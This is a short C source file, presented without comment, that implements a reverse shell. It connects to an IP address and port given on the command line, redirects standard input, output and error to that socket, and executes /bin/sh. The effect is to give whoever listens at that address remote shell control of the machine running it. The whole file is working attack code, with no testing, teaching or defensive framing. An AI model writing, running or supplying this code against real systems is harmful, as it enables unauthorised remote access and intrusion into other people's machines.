#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(int argc, char *argv[]) {
    int port;
    int sock;
    struct sockaddr_in target;

    // Check correct usage
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <IP> <port>\n", argv[0]);
        return 1;
    }

    port = atoi(argv[2]);
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    target.sin_addr.s_addr = inet_addr(argv[1]);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        perror("socket");
        return 1;
    }

    // Connect to the specified IP and port
    if (connect(sock, (struct sockaddr *)&target, sizeof(target)) == -1) {
        perror("connect");
        return 1;
    }

    // Redirect standard input, output, and error to the socket
    for (int i = 0; i <= 2; i++)
        dup2(sock, i);

    // Execute /bin/sh
    execl("/bin/sh", "sh", NULL);

    return 0;
}
